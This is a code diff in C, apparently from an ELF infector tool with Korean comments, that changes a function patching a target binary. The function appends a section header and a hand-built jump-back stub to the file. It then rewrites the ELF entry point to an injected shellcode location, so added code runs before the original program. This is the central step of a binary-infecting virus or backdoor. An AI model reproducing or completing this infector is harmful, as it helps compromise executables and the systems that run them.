@@ -65,10 +65,11 @@ int activate(){
 void change_entrypoint(const char* fpath, char *newaddr){
 	int fd;
 	int i;
+	int shellcodeloc;
+	char jmp2original[12];
 	Elf64_Shdr shdr;
 	Elf64_Phdr phdr;
 	Elf64_Ehdr ehdr;
-	int shellcodeloc;
 	
 	if(access(fpath,R_OK|W_OK|X_OK)!=0){ 
 		printf("[ERROR] Permission error(%s)\n",fpath);
@@ -146,15 +147,42 @@ void change_entrypoint(const char* fpath, char *newaddr){
 	printf("[NEW] shdr.sh_addr(0x%x) = (phdr.p_vaddr(0x%x) & 0xfffff000) + (phdr.p_filesz(0x%x) & 0xfffff000) + 0x1000\n",shdr.sh_addr,phdr.p_vaddr,phdr.p_filesz);
 	printf("[NEW] shdr.sh_addr = 0x%x, shdr.sh_offset = 0x%x\n",shdr.sh_addr,shdr.sh_offset);
 	
-	shellcodeloc = shdr.sh_addr + shdr.sh_offset;
+	shellcodeloc = shdr.sh_addr + shdr.sh_offset % 0x1000; //페이지정보는 sh_addr에반영되있으므로 sh_offset에서는페이지정보제거
+	printf("[NEW] shellcodeloc(0x%x) = hdr.sh_addr(0x%x) + shdr.sh_offset(0x%x)\n",shellcodeloc, shdr.sh_addr, shdr.sh_offset);
+	
+	printf("[BEFORE] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
+	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+0), &ehdr.e_entry+0);
+	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+1), &ehdr.e_entry+1);
+	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+2), &ehdr.e_entry+2);
+	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+3), &ehdr.e_entry+3);
+	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+4), &ehdr.e_entry+4);
+	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+5), &ehdr.e_entry+5);
+	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+6), &ehdr.e_entry+6);
+	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+7), &ehdr.e_entry+7);
 	
 	lseek(fd,0,SEEK_END); 
 	write(fd, &shdr, sizeof(shdr));
-	write(fd, "AAAAAAAA",8);
 	
+	/* 48 b8 41 41 41 41 41 41 41 41	movabs rax,0x4141414141414141 */
+	jmp2original[0] = 0x48;
+	jmp2original[1] = 0xb8;
+	jmp2original[2] = *(&(ehdr.e_entry)+0);
+	jmp2original[3] = *(&(ehdr.e_entry)+1);
+	jmp2original[4] = *(&(ehdr.e_entry)+2);
+	jmp2original[5] = *(&(ehdr.e_entry)+3);
+	jmp2original[6] = *(&(ehdr.e_entry)+4);
+	jmp2original[7] = *(&(ehdr.e_entry)+5);
+	jmp2original[8] = *(&(ehdr.e_entry)+6);
+	jmp2original[9] = *(&(ehdr.e_entry)+7);
+	/*ff 20	jmp    QWORD PTR [rax]*/
+	jmp2original[10] = 0xff;
+	jmp2original[11] = 0x20;
 	
-	// Entry point overwriting routine.. Don't touch it!
-	ehdr.e_entry = strtol(newaddr, NULL, 16); // change ehdr struct
+	write(fd,jmp2original,sizeof(jmp2original));
+	
+	//Entry point overwriting routine.. Don't touch it!
+	//ehdr.e_entry = strtol(newaddr, NULL, 16);
+	ehdr.e_entry = shellcodeloc;
 	lseek(fd, 0, SEEK_SET);
 	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 0; //write 실패
 	printf("Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
